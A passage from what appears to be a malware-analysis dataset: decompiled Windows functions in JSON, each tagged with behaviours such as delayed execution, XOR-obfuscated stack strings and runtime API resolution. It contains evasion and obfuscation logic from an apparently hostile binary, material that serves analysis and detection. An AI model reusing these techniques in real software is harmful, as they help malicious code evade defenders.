uStack84;\n    uint uStack80;\n    int32_t iStack76;\n    uint uStack72;\n    uint uStack68;\n    \n    uVar4 = 0;\n    uStack164 = 0;\n    iStack168 = 0;\n    uStack128 = 0;\n    uStack172 = 0x40b976;\n    iStack124 = in_EDX;\n    iVar2 = (*_sym.imp.ole32.dll_CoInitializeEx)();\n    if (-1 < iVar2) {\n        uStack172 = 0;\n        uStack176 = 0;\n        uStack180 = 0;\n        uStack184 = 3;\n        uStack188 = 6;\n        uStack192 = 0;\n        uStack196 = 0;\n        uStack200 = 0xffffffff;\n        piStack204 = NULL;\n        puStack208 = 0x40b990;\n        iVar2 = (*_sym.imp.ole32.dll_CoInitializeSecurity)();\n        if (-1 < iVar2) {\n            puStack208 = &stack0xffffff44;\n            uStack188 = 0;\n            puStack212 = 0x40f3a0;\n            puStack216 = 0x1;\n            puStack220 = NULL;\n            iStack224 = 0x40f5b0;\n            uStack228 = 0x40b9b4;\n            iVar2 = (*_sym.imp.ole32.dll_CoCreateInstance)();\n            pcVar1 = _sym.imp.OLEAUT32.dll_VariantClear;\n            if (-1 < iVar2) {\n                puStack208 = &stack0xffffff5c;\n                puStack212 = 0x40b9c9;\n                (*_sym.imp.OLEAUT32.dll_VariantClear)();\n                iStack104 = iStack168;\n                puStack212 = &stack0xffffff78;\n                uStack100 = uStack164;\n                puStack216 = 0x40b9dc;\n                uStack96 = unaff_EDI;\n                (*pcVar1)();\n                uStack92 = uStack140;\n                puStack216 = &stack0xffffff84;\n                uStack88 = uStack136;\n                uStack84 = uStack132;\n                uStack80 = uStack128;\n                puStack220 = 0x40b9ef;\n                (*pcVar1)();\n                uStack80 = uStack128;\n                puStack220 = &stack0xffffff60;\n                iStack76 = iStack124;\n                uStack72 = uStack120;\n                uStack68 = uStack116;\n                iStack224 = 0x40ba05;\n                (*pcVar1)();\n                uStack236 = uStack116;\n                uStack232 = uStack112;\n                uStack228 = uStack108;\n                iStack224 = iStack104;\n                uStack252 = uStack100;\n                uStack248 = uStack96;\n                uStack244 = uStack92;\n                uStack240 = uStack88;\n                uStack268 = uStack84;\n                uStack264 = uStack80;\n                iStack260 = iStack76;\n                uStack256 = uStack72;\n                piStack288 = piStack204;\n                uStack284 = uStack164;\n                puStack292 = 0x40ba49;\n                iVar2 = (**(*piStack204 + 0x28))();\n                pcVar1 = _sym.imp.OLEAUT32.dll_VariantCopy;\n                puStack292 = &stack0xffffff18;\n                puStack296 = 0x40ba58;\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)();\n                puStack296 = &stack0xffffff34;\n                piStack300 = 0x40ba5f;\n                (*pcVar1)();\n                piStack300 = &stack0xffffff20;\n                piStack304 = 0x40ba66;\n                (*pcVar1)();\n                piStack304 = &stack0xfffffefc;\n                piStack308 = 0x40ba6d;\n                (*pcVar1)();\n                pcVar1 = _sym.imp.OLEAUT32.dll_SysReAllocString;\n                if (-1 < iVar2) {\n                    piStack308 = 0x40faec;\n                    iStack312 = 0x40ba82;\n                    iVar2 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)();\n                    if (iVar2 != 0) {\n                        piStack308 = &stack0xfffffee4;\n                        uStack284 = 0;\n                        piStack316 = piStack288;\n                        piStack320 = 0x40baa2;\n                        iStack312 = iVar2;\n                        iVar3 = (**(*piStack288 + 0x1c))();\n                        if (-1 < iVar3) {\n                            piStack320 = piStack304;\n                            piStack324 = 0x40bab0;\n                            arg_8h = (*pcVar1)();\n                            if (arg_8h != NULL) {\n                                piStack324 = NULL;\n                                piStack332 = piStack300;\n                                piStack328 = arg_8h;\n                                (**(*piStack300 + 0x3c))();\n                                piStack308 = NULL;\n                                iVar3 = (**(*piStack316 + 0x24))(piStack316);\n                                if (-1 < iVar3) {\n                                    piStack332 = NULL;\n                                    piVar5 = piStack320;\n                                    iVar3 = (**(*piStack320 + 0x24))(piStack320, &stack0xfffffeb4);\n                                    if (-1 < iVar3) {\n                                        piStack324 = NULL;\n                                        iVar3 = (**(_pe_dos_header + 0x28))(0, 9, &stack0xfffffebc);\n                                        if (-1 < iVar3) {\n                                            iVar3 = fcn.0040b5e0(extraout_ECX);\n                                            if (iVar3 != 0) {\n                                                piStack332 = fcn.0040b635(arg_8h, piStack328, arg_ch);\n                                            }\n                                            (**(piStack308 + 8))(&stack0xfffffecc);\n                                        }\n                                        (**(*piVar5 + 8))(piVar5);\n                                    }\n                                    (**(*piStack328 + 8))(piStack328);\n                                }\n                                (*_sym.imp.OLEAUT32.dll_SysStringLen)(arg_8h);\n                            }\n                            piStack324 = piStack300;\n                            piStack328 = 0x40bb68;\n                            (**(*piStack300 + 8))();\n                        }\n                        piStack324 = 0x40bb6f;\n                        piStack320 = iVar2;\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)();\n                    }\n                }\n                piStack308 = piStack288;\n                iStack312 = 0x40bb79;\n                (**(*piStack288 + 8))();\n                uVar4 = uStack172;\n            }\n        }\n        puStack208 = 0x40bb83;\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    return uVar4;\n}\n",
        "token_count": 1998
    },
    "004054a0": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004054a0(uint param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint lpBuffer;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    var_8h = param_1;\n    do {\n        *0x41baa0 = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(param_1, 0x80000000, 3, 0, 3, 0, 0);\n        if (iVar2 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n            while ((iVar3 != 0 && (param_1 = var_8h,  lpNumberOfBytesRead != 0))) {\n                puVar4 = &lpBuffer;\n                iVar3 = lpNumberOfBytesRead;\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    *0x41baa0 = *0x41baa0 >> 8 ^ *((uVar1 ^ *0x41baa0 & 0xff) * 4 + 0x40f6c0) ^ 0xd202ef8d;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n                iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n                param_1 = var_8h;\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            iVar2 = fcn.00406008(0x41bd28);\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 451
    },
    "0040cd09": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.0040cd09(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.0040c769();\n        if (iVar1 != 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n    }\n    fcn.0040c721();\n    return 0;\n}\n",
        "token_count": 81
    },
    "0040d23b": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0040d23b(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar1 == 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "0040177c": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040177c(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_24h = 0x24184a33;\n    var_20h = 0x2a7b7e40;\n    var_1ch = 0x5228204b;\n    var_18h._0_2_ = 0x3c3b;\n    var_18h._2_1_ = 0x7a;\n    var_14h = 0x4b4f397a;\n    var_10h = var_10h & 0xff000000 | 0x4f4837;\n    fcn.00401000(0xf);\n    iVar4 = var_8h;\n    iVar10 = 0;\n    iVar9 = &var_24h - var_8h;\n    do {\n        var_8h = 7;\n        puVar1 = iVar10 + iVar4;\n        iVar7 = iVar10 % 7;\n        iVar10 = iVar10 + 1;\n        *puVar1 = *(&var_14h + iVar7) ^ puVar1[iVar9];\n    } while (iVar10 < 0xf);\n    var_24h = 0x163b333c;\n    var_20h = 0x78512e34;\n    var_1ch = 0x14253279;\n    var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x51);\n    var_14h = 0x78495657;\n    var_10h = 0x4a624251;\n    fcn.00401000(0xd);\n    iVar9 = var_8h;\n    uVar8 = 0;\n    do {\n        puVar1 = uVar8 + var_8h;\n        uVar5 = uVar8 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar8 = uVar8 + 1;\n        *puVar1 = *(&var_14h + uVar5) ^ puVar1[&var_24h - var_8h];\n    } while (uVar8 < 0xd);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_8h, iVar4);\n    *0x41c210 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar6);\n    if (*0x41c210 != NULL) {\n        iVar10 = (**0x41c210)(var_ch, &var_4h);\n        var_4h = -(iVar10 != 0) & var_4h;\n    }\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_8h = var_4h;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar4);\n    (*pcVar2)(uVar6);\n    return var_8h;\n}\n",
        "token_count": 881
    },
    "0040197b": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040197b(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t var_110h;\n    int32_t var_10ch;\n    int32_t var_108h;\n    int32_t var_104h;\n    int32_t var_100h;\n    int32_t var_fch;\n    int32_t var_f8h;\n    int32_t var_f4h;\n    int32_t var_f0h;\n    int32_t var_ech;\n    int32_t var_e8h;\n    int32_t var_e4h;\n    int32_t var_e0h;\n    int32_t var_dch;\n    uint var_d8h;\n    int32_t var_d4h;\n    uint var_d0h;\n    int32_t var_cch;\n    uint var_c8h;\n    int32_t var_c4h;\n    uint var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    int32_t var_b4h;\n    uint var_b0h;\n    int32_t var_ach;\n    uint var_a8h;\n    int32_t var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    int32_t var_94h;\n    uint var_90h;\n    int32_t var_8ch;\n    uint var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h._0_2_ = 0x2412;\n    var_18h._2_1_ = 0x3b;\n    var_18h._3_1_ = 0x31;\n    var_14h._0_1_ = 0x3f;\n    var_14h._1_1_ = 0x33;\n    var_14h._2_1_ = 0x4d;\n    var_14h._3_1_ = 0x24;\n    var_10h._0_1_ = 0x15;\n    var_10h._1_1_ = 0x17;\n    var_10h._2_1_ = 0x28;\n    var_10h._3_1_ = 0x3f;\n    var_ch._0_1_ = 0x3c;\n    var_ch._1_1_ = 0x69;\n    var_ch._2_1_ = 0x33;\n    var_ch._3_1_ = 0x28;\n    var_8h._0_1_ = 0xe;\n    var_8h._1_1_ = 0x2a;\n    var_8h._2_1_ = 0x36;\n    var_8h._3_1_ = 0x37;\n    var_4h._0_1_ = 0x5e;\n    var_4h._1_1_ = 0x24;\n    var_4h._2_1_ = 0x41;\n    var_cch = 0x43784141;\n    var_c8h._0_2_ = 0x525a;\n    var_c8h._2_1_ = 0x39;\n    fcn.00401000(0x17);\n    iVar8 = 0;\n    var_38h = 7;\n    do {\n        puVar1 = iVar8 + var_100h;\n        iVar6 = iVar8 % 7;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_cch + iVar6) ^ puVar1[&var_18h - var_100h];\n    } while (iVar8 < 0x17);\n    fcn.0040b1a3();\n    var_20h._0_2_ = 0x1411;\n    var_20h._2_1_ = 0x75;\n    var_20h._3_1_ = 6;\n    var_1ch._0_1_ = 0x19;\n    var_1ch._1_1_ = 0xe;\n    var_1ch._2_2_ = 0x2c25;\n    var_18h._0_2_ = 0x4621;\n    var_18h._2_1_ = 0x1c;\n    var_18h._3_1_ = 7;\n    var_14h._0_1_ = 6;\n    var_14h._1_1_ = 0x30;\n    var_14h._2_1_ = 0x3b;\n    var_14h._3_1_ = 0x25;\n    var_10h._0_1_ = 0x5b;\n    var_10h._1_1_ = 0x1e;\n    var_10h._2_1_ = 0xf;\n    var_10h._3_1_ = 9;\n    var_ch._0_1_ = 0x12;\n    var_ch._1_1_ = 0x30;\n    var_ch._2_1_ = 0x18;\n    var_ch._3_1_ = 0x42;\n    var_8h._0_1_ = 0x1c;\n    var_8h._1_1_ = 6;\n    var_8h._2_1_ = 2;\n    var_8h._3_1_ = 0x25;\n    var_4h._0_1_ = 0x27;\n    var_4h._1_1_ = 0x71;\n    var_bch = 0x75347142;\n    var_b8h._0_2_ = 0x676a;\n    var_b8h._2_1_ = 0x42;\n    fcn.00401000(0x1e);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_cch;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_bch + iVar6) ^ puVar1[&var_20h - var_cch];\n    } while (iVar8 < 0x1e);\n    fcn.0040b1a3();\n    var_18h._0_2_ = 0x226a;\n    var_18h._2_1_ = 0x1c;\n    var_18h._3_1_ = 7;\n    var_14h._0_1_ = 0x2a;\n    var_14h._1_1_ = 0x21;\n    var_14h._2_1_ = 0x39;\n    var_14h._3_1_ = 0x5c;\n    var_10h._0_1_ = 0x2a;\n    var_10h._1_1_ = 0x3f;\n    var_10h._2_1_ = 0x1a;\n    var_10h._3_1_ = 0x30;\n    var_ch._0_1_ = 0x1a;\n    var_ch._1_1_ = 6;\n    var_ch._2_1_ = 0x50;\n    var_ch._3_1_ = 0x31;\n    var_8h._0_1_ = 0x39;\n    var_8h._1_1_ = 4;\n    var_8h._2_1_ = 0x2c;\n    var_8h._3_1_ = 0x2d;\n    var_4h._0_1_ = 0x11;\n    var_4h._1_1_ = 0x39;\n    var_ach = 0x68504739;\n    var_a8h._0_2_ = 0x4a49;\n    var_a8h._2_1_ = 0x74;\n    fcn.00401000(0x16);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_bch;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_ach + iVar6) ^ puVar1[&var_18h - var_bch];\n    } while (iVar8 < 0x16);\n    fcn.0040b1a3();\n    var_1ch._0_1_ = 6;\n    var_1ch._1_1_ = 0x32;\n    var_1ch._2_2_ = 0x183d;\n    var_18h._0_2_ = 0x2337;\n    var_18h._2_1_ = 0x2e;\n    var_18h._3_1_ = 0x11;\n    var_14h._0_1_ = 0x26;\n    var_14h._1_1_ = 0x32;\n    var_14h._2_1_ = 0x25;\n    var_14h._3_1_ = 3;\n    var_10h._0_1_ = 0x3b;\n    var_10h._1_1_ = 0x25;\n    var_10h._2_1_ = 0x2a;\n    var_10h._3_1_ = 0x20;\n    var_ch._0_1_ = 0x27;\n    var_ch._1_1_ = 0x3e;\n    var_ch._2_1_ = 2;\n    var_ch._3_1_ = 0x1f;\n    var_8h._0_1_ = 0x38;\n    var_8h._1_1_ = 0x34;\n    var_8h._2_1_ = 0x2c;\n    var_8h._3_1_ = 0x15;\n    var_4h._0_1_ = 0x55;\n    var_2ch._0_1_ = 0x55;\n    var_2ch._1_2_ = 0x7457;\n    var_2ch._3_1_ = 0x76;\n    var_28h._0_1_ = 0x54;\n    var_28h._1_1_ = 0x51;\n    var_28h._2_1_ = 0x4b;\n    var_28h._3_1_ = 0x70;\n    fcn.00401000(0x19);\n    uVar7 = 0;\n    do {\n        puVar1 = uVar7 + var_ach;\n        uVar5 = uVar7 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_2ch + uVar5) ^ puVar1[&var_1ch - var_ach];\n    } while (uVar7 < 0x19);\n    fcn.0040b1a3();\n    var_1ch._0_1_ = 0x61;\n    var_1ch._1_1_ = 0xb;\n    var_1ch._2_2_ = 0x5d00;\n    var_18h._0_2_ = 0x563a;\n    var_18h._2_1_ = 0x25;\n    var_18h._3_1_ = 0x5b;\n    var_14h._0_1_ = 0xd;\n    var_14h._1_1_ = 0x3c;\n    var_14h._2_1_ = 0x47;\n    var_14h._3_1_ = 0x2c;\n    var_10h._0_1_ = 0x5d;\n    var_10h._1_1_ = 0;\n    var_10h._2_1_ = 0x5c;\n    var_10h._3_1_ = 0x1e;\n    var_ch._0_1_ = 0x20;\n    var_ch._1_1_ = 0x47;\n    var_ch._2_1_ = 0x19;\n    var_ch._3_1_ = 0x4b;\n    var_8h._0_1_ = 0x20;\n    var_8h._1_1_ = 0x44;\n    var_8h._2_1_ = 7;\n    var_8h._3_1_ = 0x39;\n    var_4h._0_1_ = 0x56;\n    var_4h._1_1_ = 0x2e;\n    var_4h._2_1_ = 0x5c;\n    var_4h._3_1_ = 0x49;\n    var_9ch = 0x33556e32;\n    var_98h._0_2_ = 0x3949;\n    var_98h._2_1_ = 0x49;\n    fcn.00401000(0x1c);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_e4h;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_9ch + iVar6) ^ puVar1[&var_1ch - var_e4h];\n    } while (iVar8 < 0x1c);\n    fcn.0040b1a3();\n    var_1ch._0_1_ = 0x26;\n    var_1ch._1_1_ = 0x5c;\n    var_1ch._2_2_ = 0x2e1b;\n    var_18h._0_2_ = 0x1b53;\n    var_18h._2_1_ = 0x3c;\n    var_18h._3_1_ = 6;\n    var_14h._0_1_ = 0x10;\n    var_14h._1_1_ = 0x78;\n    var_14h._2_1_ = 0x35;\n    var_14h._3_1_ = 0x2c;\n    var_10h._0_1_ = 0x5f;\n    var_10h._1_1_ = 6;\n    var_10h._2_1_ = 0x3b;\n    var_10h._3_1_ = 0x1c;\n    var_ch._0_1_ = 0x25;\n    var_ch._1_1_ = 0x4b;\n    var_ch._2_1_ = 0x3f;\n    var_ch._3_1_ = 0x39;\n    var_8h._0_1_ = 0x59;\n    var_8h._1_1_ = 0x1f;\n    var_8h._2_1_ = 0x30;\n    var_8h._3_1_ = 0xf;\n    var_4h._0_1_ = 0x10;\n    var_4h._1_1_ = 0x39;\n    var_2ch._0_1_ = 0x75;\n    var_2ch._1_2_ = 0x5639;\n    var_2ch._3_1_ = 0x4f;\n    var_28h._0_1_ = 0x30;\n    var_28h._1_1_ = 0x73;\n    var_28h._2_1_ = 0x55;\n    var_28h._3_1_ = 0x68;\n    fcn.00401000(0x1a);\n    uVar7 = 0;\n    do {\n        puVar1 = uVar7 + var_9ch;\n        uVar5 = uVar7 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_2ch + uVar5) ^ puVar1[&var_1ch - var_9ch];\n    } while (uVar7 < 0x1a);\n    fcn.0040b1a3();\n    var_34h = 0x37043410;\n    var_30h._0_1_ = 0x50;\n    var_30h._1_1_ = 0x3f;\n    var_30h._2_1_ = 7;\n    var_30h._3_1_ = 0x2a;\n    var_2ch._0_1_ = 0x27;\n    var_2ch._1_2_ = 0x3839;\n    var_2ch._3_1_ = 0x57;\n    var_28h._0_1_ = 8;\n    var_28h._1_1_ = 0x10;\n    var_28h._2_1_ = 0x43;\n    var_8ch = 0x54505143;\n    var_88h._0_2_ = 0x6f32;\n    var_88h._2_1_ = 0x75;\n    fcn.00401000(0xf);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_f4h;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_8ch + iVar6) ^ puVar1[&var_34h - var_f4h];\n    } while (iVar8 < 0xf);\n    fcn.0040b1a3();\n    var_14h._0_1_ = 0x1c;\n    var_14h._1_1_ = 0x57;\n    var_14h._2_1_ = 0x3f;\n    var_14h._3_1_ = 0x21;\n    var_10h._0_1_ = 0xe;\n    var_10h._1_1_ = 0x25;\n    var_10h._2_1_ = 0x38;\n    var_10h._3_1_ = 0x26;\n    var_ch._0_1_ = 0x46;\n    var_ch._1_1_ = 0x15;\n    var_ch._2_1_ = 0x14;\n    var_ch._3_1_ = 0x1f;\n    var_8h._0_1_ = 0x39;\n    var_8h._1_1_ = 0x3c;\n    var_8h._2_1_ = 0x26;\n    var_8h._3_1_ = 0x5e;\n    var_4h._0_1_ = 9;\n    var_4h._1_1_ = 0x23;\n    var_4h._2_1_ = 8;\n    var_4h._3_1_ = 0x50;\n    var_7ch = 0x446c324f;\n    var_78h._0_2_ = 0x506d;\n    var_78h._2_1_ = 0x4a;\n    fcn.00401000(0x14);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_8ch;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_7ch + iVar6) ^ puVar1[&var_14h - var_8ch];\n    } while (iVar8 < 0x14);\n    fcn.0040b1a3();\n    var_1ch._0_1_ = 0x14;\n    var_1ch._1_1_ = 0x3c;\n    var_1ch._2_2_ = 0x5020;\n    var_18h._0_2_ = 0xf12;\n    var_18h._2_1_ = 6;\n    var_18h._3_1_ = 0x30;\n    var_14h._0_1_ = 0x37;\n    var_14h._1_1_ = 0x11;\n    var_14h._2_1_ = 0x43;\n    var_14h._3_1_ = 10;\n    var_10h._0_1_ = 2;\n    var_10h._1_1_ = 0x20;\n    var_10h._2_1_ = 0x37;\n    var_10h._3_1_ = 9;\n    var_ch._0_1_ = 6;\n    var_ch._1_1_ = 0x58;\n    var_ch._2_1_ = 0xf;\n    var_ch._3_1_ = 3;\n    var_8h._0_1_ = 0x25;\n    var_8h._1_1_ = 0x22;\n    var_8h._2_1_ = 0x3e;\n    var_8h._3_1_ = 0x11;\n    var_4h._0_1_ = 0x31;\n    var_6ch = 0x31745947;\n    var_68h._0_2_ = 0x6a79;\n    var_68h._2_1_ = 0x49;\n    fcn.00401000(0x19);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_7ch;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_6ch + iVar6) ^ puVar1[&var_1ch - var_7ch];\n    } while (iVar8 < 0x19);\n    fcn.0040b1a3();\n    var_18h._0_2_ = 0x3661;\n    var_18h._2_1_ = 7;\n    var_18h._3_1_ = 4;\n    var_14h._0_1_ = 0x30;\n    var_14h._1_1_ = 0x26;\n    var_14h._2_1_ = 0x1c;\n    var_14h._3_1_ = 0x40;\n    var_10h._0_1_ = 0x3a;\n    var_10h._1_1_ = 0x3d;\n    var_10h._2_1_ = 0xe;\n    var_10h._3_1_ = 0x23;\n    var_ch._0_1_ = 0x12;\n    var_ch._1_1_ = 0x2a;\n    var_ch._2_1_ = 0x5b;\n    var_ch._3_1_ = 0x25;\n    var_8h._0_1_ = 0x22;\n    var_8h._2_1_ = 0x34;\n    var_8h._3_1_ = 0x25;\n    var_4h._0_1_ = 0x3d;\n    var_4h._1_1_ = 0x32;\n    var_5ch = 0x6b4b5332;\n    var_58h._0_2_ = 0x4251;\n    var_58h._2_1_ = 0x58;\n    var_8h._1_1_ = var_18h._2_1_;\n    fcn.00401000(0x16);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_6ch;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_5ch + iVar6) ^ puVar1[&var_18h - var_6ch];\n    } while (iVar8 < 0x16);\n    fcn.0040b1a3();\n    var_1ch._0_1_ = 0x27;\n    var_1ch._1_1_ = 0x2e;\n    var_1ch._2_2_ = 0x4c29;\n    var_18h._0_2_ = 0x2016;\n    var_18h._2_1_ = 0x16;\n    var_18h._3_1_ = 0x19;\n    var_14h._0_1_ = 0x1b;\n    var_14h._1_1_ = 8;\n    var_14h._2_1_ = 0x5a;\n    var_14h._3_1_ = 3;\n    var_10h._0_1_ = 0x3d;\n    var_10h._1_1_ = 0x1f;\n    var_10h._2_1_ = 0x11;\n    var_10h._3_1_ = 0x1b;\n    var_ch._0_1_ = 8;\n    var_ch._1_1_ = 0x5c;\n    var_ch._2_1_ = 0x13;\n    var_ch._3_1_ = 0x3d;\n    var_8h._0_1_ = 0x1f;\n    var_8h._1_1_ = 0x11;\n    var_8h._2_1_ = 0x2c;\n    var_8h._3_1_ = 0x1f;\n    var_4h._0_1_ = 0x35;\n    var_4ch = 0x357a4b74;\n    var_48h._0_2_ = 0x5465;\n    var_48h._2_1_ = 0x73;\n    fcn.00401000(0x19);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_5ch;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_4ch + iVar6) ^ puVar1[&var_1ch - var_5ch];\n    } while (iVar8 < 0x19);\n    fcn.0040b1a3();\n    var_18h._0_2_ = 0xb6b;\n    var_18h._2_1_ = 2;\n    var_18h._3_1_ = 0x29;\n    var_14h._0_1_ = 0x1f;\n    var_14h._1_1_ = 0x13;\n    var_14h._2_1_ = 0x28;\n    var_14h._3_1_ = 0x5c;\n    var_10h._0_1_ = 0x4c;\n    var_10h._1_1_ = 7;\n    var_10h._2_1_ = 0x3c;\n    var_10h._3_1_ = 0x35;\n    var_ch._0_1_ = 0x3c;\n    var_ch._1_1_ = 0x15;\n    var_ch._2_1_ = 0x24;\n    var_ch._3_1_ = 0x47;\n    var_8h._0_1_ = 0x51;\n    var_8h._1_1_ = 2;\n    var_8h._2_1_ = 0x34;\n    var_8h._3_1_ = 0x37;\n    var_4h._0_1_ = 9;\n    var_4h._1_1_ = 0x67;\n    var_2ch._0_1_ = 0x38;\n    var_2ch._1_2_ = 0x516e;\n    var_2ch._3_1_ = 0x50;\n    var_28h._0_1_ = 0x6c;\n    var_28h._1_1_ = 0x67;\n    var_28h._2_1_ = 0x4d;\n    var_28h._3_1_ = 0x31;\n    fcn.00401000(0x16);\n    uVar7 = 0;\n    do {\n        puVar1 = uVar7 + var_4ch;\n        uVar5 = uVar7 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_2ch + uVar5) ^ puVar1[&var_18h - var_4ch];\n    } while (uVar7 < 0x16);\n    fcn.0040b1a3();\n    var_20h._0_2_ = 0x1717;\n    var_20h._2_1_ = 0x1a;\n    var_20h._3_1_ = 0x16;\n    var_1ch._0_1_ = 0x17;\n    var_1ch._1_1_ = 0x27;\n    var_1ch._2_2_ = 0x283e;\n    var_18h._0_2_ = 0x1917;\n    var_18h._2_1_ = 0xd;\n    var_18h._3_1_ = 0x16;\n    var_14h._0_1_ = 0x26;\n    var_14h._1_1_ = 0x3b;\n    var_14h._2_1_ = 0x21;\n    var_14h._3_1_ = 0x22;\n    var_10h._0_1_ = 0x38;\n    var_10h._1_1_ = 0xb;\n    var_10h._2_1_ = 0x1b;\n    var_10h._3_1_ = 0x24;\n    var_ch._0_1_ = 0x24;\n    var_ch._1_1_ = 0x37;\n    var_ch._2_1_ = 0x22;\n    var_ch._3_1_ = 0x38;\n    var_8h._0_1_ = 0xd;\n    var_8h._1_1_ = 0xe;\n    var_8h._2_1_ = 0x28;\n    var_8h._3_1_ = 0x3b;\n    var_4h._0_1_ = 0x21;\n    var_4h._1_1_ = 0x15;\n    var_4h._2_1_ = 0x2f;\n    var_4h._3_1_ = 100;\n    var_44h = 0x644a7244;\n    var_40h._0_2_ = 0x4178;\n    var_40h._2_1_ = 0x57;\n    fcn.00401000(0x20);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_f8h;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_44h + iVar6) ^ puVar1[&var_20h - var_f8h];\n   